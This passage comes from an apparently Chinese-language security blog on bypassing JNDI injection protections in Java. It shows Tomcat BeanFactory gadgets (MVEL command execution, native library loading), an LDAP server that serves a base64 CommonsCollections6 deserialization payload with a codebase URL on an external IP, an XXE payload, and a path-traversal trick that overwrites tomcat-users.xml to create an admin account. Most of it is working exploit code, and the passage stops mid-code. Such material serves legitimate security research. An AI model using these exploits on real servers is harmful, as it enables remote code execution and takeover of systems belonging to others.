class="string">&quot;&lt;/java.util.PriorityQueue&gt;&quot;</span>;</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=fromXML&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, xml));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329174546.png" alt="image.png"></p>
<h4 id="MVEL"><a href="#MVEL" class="headerlink" title="MVEL"></a>MVEL</h4><p>org.mvel2.sh.ShellSession#exec(String)可以通过push执行execute来执行命令</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mvel<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mvel2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.8.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">tomcat_MVEL</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.mvel2.sh.ShellSession&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=exec&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>,</span><br><span class="line">            <span class="string">&quot;push Runtime.getRuntime().exec(&#x27;calc&#x27;);&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329223151.png" alt="image.png"></p>
<p>这里先把传入的<code>push Runtime.getRuntime().exec(&#39;calc&#39;);</code>赋值给inTokens变量<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329223440.png" alt="image.png"><br>然后进入if判断语句,<code>this.commands</code>有9个内置的数据<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329223538.png" alt="image.png"><br>我们已经传了push了可以进入if语句,然后把数组第二个元素赋值给passParameters变量<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329223811.png" alt="image.png"></p>
<p>然后调用<code>((Command)this.commands.get(inTokens[0])).execute(this, passParameters);</code>执行命令<br>弹出计算器<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329223934.png" alt="image.png"></p>
<h4 id="NativeLibLoader"><a href="#NativeLibLoader" class="headerlink" title="NativeLibLoader"></a>NativeLibLoader</h4><p>com.sun.glass.utils.NativeLibLoader的loadLibrary(String)方法<br>有一个<code>system.load(libFileName)</code>,可以加载指定路径的动态链接库文件</p>
<p>Windows下做个弹计算器的dll<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># macOS</span><br><span class="line">gcc -shared -fPIC exp.c -o exp.dylib</span><br><span class="line"></span><br><span class="line"># Linux</span><br><span class="line">gcc -shared -fPIC exp.c -o exp.so</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">tomcat_loadLibrary</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;com.sun.glass.utils.NativeLibLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=loadLibrary&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;/../../../../../../../path&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我在Windows下没有复现成功,调试发现<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240330010306.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240330010325.png" alt="image.png"></p>
<p>尝试了很多种路径的写法都不行,后面调了两个小时找到了原因,这个路径的拼接问题,我的calculator.dll放在<code>&quot;C:\Users\30779\Desktop\共享\payload\calculator.dll&quot;</code>的,但是拼接的时候获取的是NativeLibLoader.class的路径,我本地是安装在<code>E:\Java\java-8u201\jdk8u-201\jre\lib\</code>的<br>之前的路径拼接是有问题的,因为E盘的文件夹内不管多少的../最终都回到E://,而后面接着C://就不符合Windows的路径规则<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240330013157.png" alt="image.png"><br>这里执行之后res会成功解析出<code>E:\calculator.dll</code><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240330013331.png" alt="image.png"><br>而我们本地已经把dll文件复制到E盘了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240330013352.png" alt="image.png"><br>因此最后执行成功,弹出计算器<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240330013437.png" alt="image.png"></p>
<h3 id="利用LDAP返回序列化对象"><a href="#利用LDAP返回序列化对象" class="headerlink" title="利用LDAP返回序列化对象"></a>利用LDAP返回序列化对象</h3><p>LDAP服务端不仅支持JNDI Reference的利用方式,还支持直接返回一个序列化的对象,当Java对象的javaSerializedData属性值不为空时,客户端的obj.decodeObject()方法就会对这个字段的内容反序列化</p>
<p>yso生成一个cc6的payload:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master.jar CommonsCollections6 &#x27;calc&#x27; | base64</span><br></pre></td></tr></table></figure></p>
<p>ldap server:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ldapbypass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://111.229.158.40:8000/#Evil&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * */</span> <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         * * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span> <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Payload1: 利用LDAP+Reference Factory</span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Payload2: 返回序列化Gadget</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>poe.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>客户端:<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.80<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>java代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//import com.alibaba.fastjson.JSON;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testbypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// lookup参数注入触发</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(<span class="string">&quot;ldap://localhost:1234/Evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fastjson反序列化JNDI注入Gadget触发</span></span><br><span class="line"><span class="comment">//        String payload =&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;;</span></span><br><span class="line"><span class="comment">//        JSON.parse(payload);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329142423.png" alt="image.png"></p>
<p>调用栈:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readObject:431, ObjectInputStream (java.io)</span><br><span class="line">deserializeObject:531, Obj (com.sun.jndi.ldap)</span><br><span class="line">decodeObject:239, Obj (com.sun.jndi.ldap)</span><br><span class="line">c_lookup:1051, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">main:10, testbypass</span><br></pre></td></tr></table></figure></p>
<h2 id="XXE-amp-RCE"><a href="#XXE-amp-RCE" class="headerlink" title="XXE&amp;RCE"></a>XXE&amp;RCE</h2><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><code>org.apache.catalina.users.MemoryUserDatabaseFactory</code>的getObjectIntance()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240331105457.png" alt="image.png"></p>
<p>先创建一个MemoryUserDatabase对象,获取pathname和readonly属性调用setter方法赋值给新数据库对象<br>然后调用open()函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240331110433.png" alt="image.png"><br><code>InputStream is = uConn.getInputStream();</code>这里发起的http请求,这里把xml解析的结果赋给user,role,group,最后调用parse函数解析<img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240331110930.png" alt="image.png"><br>把之前的http请求信息parse处理<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">XXEexp</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.apache.catalina.UserDatabase&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="literal">true</span>, <span class="string">&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;pathname&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/exp.xml&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>exp.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:8888/hello&quot;</span>&gt;</span>%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240331105204.png" alt="image.png"></p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="创建管理员账号密码"><a href="#创建管理员账号密码" class="headerlink" title="创建管理员账号密码"></a>创建管理员账号密码</h4><p>这里利用的是MemoryUserDatabase的save方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401161854.png" alt="image.png"></p>
<p>这里需要经过 <code>isWriteable()==true</code>的判断<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401161939.png" alt="image.png"><br>这里的<code>new File(System.getProperty(&quot;catalina.base&quot;), this.pathname)</code><br>把tomcat的安装目录和可控的pathname拼接组成文件名生成一个File对象<br>==所以这个目录必然<strong>不存在、不是目录、不可写</strong>，也就无法通过判断==</p>
<p>这里可以利用目录跳转:<br>假设catalina.base是<code>/usr/apache-tomcat-8.5.73/</code>,<code>pathname=http://127.0.0.1:8888/../../conf/tomcat-users.xml</code><br>拼接的路径是<code>/usr/apache-tomcat-8.5.73/http:/127.0.0.1:8888/../../conf/tomcat-users.xml</code></p>
<p>getParentFile 获取到的是 <code>/usr/apache-tomcat-8.5.73/http:/127.0.0.1:8888/../../conf/</code></p>
<p>在 Windows 下这样没问题，但如果是Linux系统的话,需要存在http:和127.0.0.1:8888这两个目录</p>
<p>Windows:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.api.ha.StickyFeature;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ldapbypass</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">exp</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.apache.catalina.UserDatabase&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="literal">true</span>, <span class="string">&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;pathname&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/../../conf/tomcat-users.xml&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;readonly&quot;</span>, <span class="string">&quot;false&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> 